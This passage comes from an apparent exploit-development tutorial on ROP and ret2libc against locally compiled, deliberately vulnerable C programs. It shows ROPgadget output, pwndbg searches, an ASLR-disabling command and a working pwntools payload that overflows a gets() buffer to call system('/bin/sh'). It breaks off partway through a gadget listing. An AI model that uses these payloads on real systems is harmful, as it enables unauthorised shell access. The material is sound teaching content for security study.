</span></span><span style="display:flex;"><span>0x000000000040103e : call qword ptr <span style="color:#f92672">[</span>rax - 0x5e1f00d<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0x0000000000401014 : call rax
</span></span><span style="display:flex;"><span>0x00000000004011f3 : cli ; jmp 0x401180
</span></span><span style="display:flex;"><span>0x0000000000401143 : cli ; ret
</span></span><span style="display:flex;"><span>0x000000000040132b : cli ; sub rsp, <span style="color:#ae81ff">8</span> ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x00000000004011f0 : endbr64 ; jmp 0x401180
</span></span><span style="display:flex;"><span>0x0000000000401140 : endbr64 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012fc : fisttp word ptr <span style="color:#f92672">[</span>rax - 0x7d<span style="color:#f92672">]</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040113e : hlt ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x0000000000401012 : je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>0x0000000000401165 : je 0x401170 ; mov edi, 0x404070 ; jmp rax
</span></span><span style="display:flex;"><span>0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404070 ; jmp rax
</span></span><span style="display:flex;"><span>0x000000000040103a : jmp 0x401020
</span></span><span style="display:flex;"><span>0x00000000004011f4 : jmp 0x401180
</span></span><span style="display:flex;"><span>0x000000000040100b : jmp 0x4840103f
</span></span><span style="display:flex;"><span>0x000000000040116c : jmp rax
</span></span><span style="display:flex;"><span>0x0000000000401168 : jo 0x4011aa ; add dil, dil ; loopne 0x4011d5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x0000000000401220 : leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040116d : loopne 0x4011d5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004011d6 : mov byte ptr <span style="color:#f92672">[</span>rip + 0x2e8c<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span>0x00000000004012a7 : mov eax, <span style="color:#ae81ff">0</span> ; leave ; ret
</span></span><span style="display:flex;"><span>0x0000000000401167 : mov edi, 0x404070 ; jmp rax
</span></span><span style="display:flex;"><span>0x00000000004011d8 : mov word ptr <span style="color:#f92672">[</span>rsi<span style="color:#f92672">]</span>, gs ; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x000000000040113f : nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040121f : nop ; leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040116f : nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004011ec : nop dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span> ; endbr64 ; jmp 0x401180
</span></span><span style="display:flex;"><span>0x0000000000401166 : or dword ptr <span style="color:#f92672">[</span>rdi + 0x404070<span style="color:#f92672">]</span>, edi ; jmp rax
</span></span><span style="display:flex;"><span>0x000000000040130c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040130e : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x0000000000401310 : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x0000000000401312 : pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040130b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040130f : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004011dd : pop rbp ; ret
</span></span><span style="display:flex;"><span>0x0000000000401313 : pop rdi ; ret
</span></span><span style="display:flex;"><span>0x0000000000401311 : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040130d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040101a : ret
</span></span><span style="display:flex;"><span>0x0000000000401011 : sal byte ptr <span style="color:#f92672">[</span>rdx + rax - 1<span style="color:#f92672">]</span>, 0xd0 ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040105b : sar edi, 0xff ; call qword ptr <span style="color:#f92672">[</span>rax - 0x5e1f00d<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0x000000000040132d : sub esp, <span style="color:#ae81ff">8</span> ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040132c : sub rsp, <span style="color:#ae81ff">8</span> ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404070 ; jmp rax
</span></span><span style="display:flex;"><span>0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404070 ; jmp rax
</span></span><span style="display:flex;"><span>0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">70</span>
</span></span></code></pre></div><p>We can see we got 70 different small pieces of code with its address that we can use but we want that one which can change value of <code>RDI</code>. If we look at output above we can see this instruction is what we need.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x0000000000401313 : pop rdi ; ret
</span></span></code></pre></div><p>It <strong>pops</strong> (removes) a value from the stack into the <strong>RDI</strong> register. Then it executes a <strong>ret</strong>, which means it will return to the next address on the stack. We know stack follows LIFO (Last In, First Out). <strong>Stack</strong> is like a stack of plates, you add things on top (calls push), you remove things from top only (called pop). The last item you put in is the <strong>first</strong> one you take out that&rsquo;s why it‚Äôs called <strong>Last In, First Out (LIFO)</strong>.</p>
<p>Now we need to remember that system function <code>system@plt</code> takes pointer of string not the whole string. It means that we cant directly write <code>/bin/sh</code> in RDI but we need to put such address that points to string <code>/bin/sh</code>. To make things easier we can see if this program has <code>/bin/sh</code> string it or not using <code>pwngdb</code> command <code>search</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/rop 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Enter Data - ^C
</span></span></code></pre></div><p>After running program enter <code>Ctrl+C</code> to stop program in middle so its running. and then:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; search /bin/sh
</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> byte: b<span style="color:#e6db74">&#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>rop             0x404060 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span><span style="display:flex;"><span>libc.so.6       0x77efff7cb42f 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span></code></pre></div><p>We can see we got 2 output, Second one is of shared library thats why its not of our use but First one is what we need. So the address that we need is <code>0x404060</code>. <code>0x68732f6e69622f</code> is hexadecimal representation of ASCII string <code>/bin/sh</code> don&rsquo;t confuse it with memory address.</p>
<p>Actually <code>pwntools</code> can do all these extracting the address in one line but we are doing it currently for understanding from basics. Writing exploit in python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the ELF binary</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./rop&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the vulnerable binary as a process</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ROP gadget: pop value into RDI (first argument in x86-64 calling convention)</span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401313</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Address of the string &#34;/bin/sh&#34; in the binary&#39;s .data section</span>
</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404060</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#39;ret&#39; gadget for stack alignment (some systems require 16-byte alignment before calls)</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Address of the &#39;system&#39; function in the binary&#39;s PLT (Procedure Linkage Table)</span>
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build the payload:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Overflow buffer with 40 bytes (determined previously)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Set up RDI to point to &#34;/bin/sh&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Align the stack (optional but good practice)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Jump to system(&#34;/bin/sh&#34;)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(bin_sh) <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(system)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the payload to the process</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Drop to interactive shell to use the spawned shell (if exploit works)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0x6---ret2libc">0x6 - Ret2LIBC</h2>
<p>This is another method used to bypass <strong>NX (Non-Executable Stack)</strong> protection. In previous techniques like ROP (Return Oriented Programming), we might have had the <code>system()</code> function and the <code>/bin/sh</code> string already present in the binary, making it easier to construct our exploit.</p>
<p>However, in a <strong>ret2libc</strong> attack, we assume that the <code>system()</code> function is not part of the binary itself, but is instead located in a <strong>shared library</strong> (typically libc ‚Äì the standard C library). Similarly, the string <code>&quot;/bin/sh&quot;</code> is often also found within libc.</p>
<p>So, instead of using gadgets from the binary, we redirect execution to libc‚Äôs <code>system()</code> function and pass the address of the <code>&quot;/bin/sh&quot;</code> string (also in libc) as its argument. This allows us to spawn a shell even when the binary lacks both <code>system()</code> and <code>/bin/sh</code>.</p>
<p>But first lets disable ASLR from Linux system (We will later learn on how to bypass ASLR also.)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ echo <span style="color:#ae81ff">0</span> | sudo tee /proc/sys/kernel/randomize_va_space
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uid_t</span> uid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresuid</span>(uid, uid, uid);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter Data - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(buff);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc ret2libc.c -o ret2libc -no-pie -fno-stack-protector</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la ret2libc
</span></span><span style="display:flex;"><span>-rwsrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16920</span> Jun <span style="color:#ae81ff">26</span> 17:03 ret2libc
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2libc     
</span></span><span style="display:flex;"><span>Enter Data - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">9055</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./ret2libc
</span></span></code></pre></div><p>Its basically functions same as previous one.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401090  setresuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010a0  setresgid@plt
</span></span><span style="display:flex;"><span>0x00000000004010b0  printf@plt
</span></span><span style="display:flex;"><span>0x00000000004010c0  geteuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010d0  gets@plt
</span></span><span style="display:flex;"><span>0x00000000004010e0  getegid@plt
</span></span><span style="display:flex;"><span>0x00000000004010f0  _start
</span></span><span style="display:flex;"><span>0x0000000000401120  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401130  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401160  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004011a0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004011d0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004011d6  init
</span></span><span style="display:flex;"><span>0x0000000000401223  main
</span></span><span style="display:flex;"><span>0x0000000000401270  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004012e0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004012e8  _fini
</span></span></code></pre></div><p>Previously we had <code>callme</code> function which made our work easier but not this time. Now disassembling main function.</p>
<p><img src="/img/pwn12.png" alt="pwn12.png"></p>
<p>Its simple function that is calling <code>printf</code> function to print and uses <code>gets</code> function also which is vulnerable function. There is no <code>system</code> function like before. Lets run it in <code>pwngdb</code>. Use <code>run</code> command and press <code>CTRL+C</code> so program is running.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/ret2libc 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Enter Data - ^C
</span></span></code></pre></div><p>If we search for <code>/bin/sh</code> like before we won&rsquo;t see it in our binary like in ROP program but we see in shared library of <code>libc</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; search /bin/sh
</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> byte: b<span style="color:#e6db74">&#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>libc.so.6       0x7ffff7dcb42f 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span></code></pre></div><p>First lets find at what offset overflow occurs like in all previous Challenges. After doing it we get offset at <code>40</code>, read Stack Overflow section for doing it we have repeated same step to find offset. Now lets write exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>This time we dont have any address to put in <code>pack()</code> where it can return to, Unlike in ROP we cant take from system function because it doesn&rsquo;t exist but we can take gadgets from shared library. Lets use ROPgadget to see gadgets that we can use first.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary ret2libc 
</span></span><span style="display:flex;"><span>Gadgets information
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
</span></span><span style="display:flex;"><span>0x000000000040111d : add ah, dh ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040114b : add bh, bh ; loopne 0x4011b5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004012dc : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040125c : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040125d : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add cl, cl ; ret
</span></span><span style="display:flex;"><span>0x0000000000401036 : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dl, dh ; jmp 0x401020
</span></span><span style="display:flex;"><span>0x00000000004011ba : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004012de : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040111c : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; hlt ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040125e : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040100d : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; test rax, rax ; je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>0x00000000004011bb : add byte ptr <span style="color:#f92672">[</span>rcx<span style="color:#f92672">]</span>, al ; pop rbp ; ret
</span></span><span style="display:flex;"><span>0x00000000004011b9 : add byte ptr cs:<span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x000000000040111b : add byte ptr cs:<span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; hlt ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040125f : add cl, cl ; ret
</span></span><span style="display:flex;"><span>0x000000000040114a : add dil, dil ; loopne 0x4011b5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x0000000000401038 : add dl, dh ; jmp 0x401020
</span></span><span style="display:flex;"><span>0x00000000004011bc : add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004011b7 : add eax, 0x2e9b ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
</span></span><span style="display:flex;"><span>0x0000000000401017 : add esp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x0000000000401016 : add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040121f : call qword ptr <span style="color:#f92672">[</span>rax + 0xff3c3c9<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0x000000000040103e : call qword ptr <span style="color:#f92672">[</span>rax - 0x5e1f00d<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0x0000000000401014 : call rax
</span></span><span style="display:flex;"><span>0x00000000004011d3 : cli ; jmp 0x401160
</span></span><span style="display:flex;"><span>0x0000000000401123 : cli ; ret
</span></span><span style="display:flex;"><span>0x00000000004012eb : cli ; sub rsp, <span style="color:#ae81ff">8</span> ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x00000000004011d0 : endbr64 ; jmp 0x401160
</span></span><span style="display:flex;"><span>0x0000000000401120 : endbr64 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012bc : fisttp word ptr <span style="color:#f92672">[</span>rax - 0x7d<span style="color:#f92672">]</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040111e : hlt ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x0000000000401012 : je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>0x0000000000401145 : je 0x401150 ; mov edi, 0x404058 ; jmp rax
</span></span><span style="display:flex;"><span>0x0000000000401187 : je 0x401190 ; mov edi, 0x404058 ; jmp rax
</span></span><span style="display:flex;"><span>0x000000000040103a : jmp 0x401020
</span></span><span style="display:flex;"><span>0x00000000004011d4 : jmp 0x401160
</span></span><span style="display:flex;"><span>0x000000000040100b : jmp 0x4840103f
</span></span><span style="display:flex;"><span>0x000000000040114c : jmp rax
</span></span><span style="display:flex;"><span>0x0000000000401221 : leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040114d : loopne 0x4011b5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004011b6 : mov byte ptr <span style="color:#f92672">[</span>rip + 0x2e9b<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span>0x000000000040125b : mov eax, <span style="color:#ae81ff">0</span> ; leave ; ret
</span></span><span style="display:flex;"><span>0x0000000000401147 : mov edi, 0x404058 ; jmp rax
</span></span><span style="display:flex;"><span>0x000000000040111f : nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x0000000000401220 : nop ; leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040114f : nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004011cc : nop dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span> ; endbr64 ; jmp 0x401160
</span></span><span style="display:flex;"><span>0x0000000000401146 : or dword ptr <span style="color:#f92672">[</span>rdi + 0x404058<span style="color:#f92672">]</span>, edi ; jmp rax
</span></span><span style="display:flex;"><span>0x00000000004012cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012ce : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012d0 : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012d2 : pop r15 ; ret
</span></span><span style="display:flex;"><span>0x0000000000401148 : pop rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004012cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012cf : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004011bd : pop rbp ; ret
</span></span><span style="display:flex;"><span>0x00000000004012d3 : pop rdi ; ret
</span></span><span style="display:flex;"><span>0x00000000004012d1 : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span>0x000000000040101a : ret
</span></span><span style="display:flex;"><span>0x0000000000401011 : sal byte ptr <span style="color:#f92672">[</span>rdx + rax - 1<span style="color:#f92672">]</span>, 0xd0 ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040105b : sar edi, 0xff ; call qword ptr <span style="color:#f92672">[</span>rax - 0x5e1f00d<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0x00000000004012ed : sub esp, <span style="color:#ae81ff">8</span> ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x00000000004012ec : sub rsp, <span style="color:#ae81ff">8</span> ; add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>0x0000000000401143 : test eax, eax ; je 0x401150 ; mov edi, 0x404058 ; jmp rax
</span></span><span style="display:flex;"><span>0x0000000000401185 : test eax, eax ; je 0x401190 ; mov edi, 0x404058 ; jmp rax
</span></span><span style="display:flex;"><span>0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
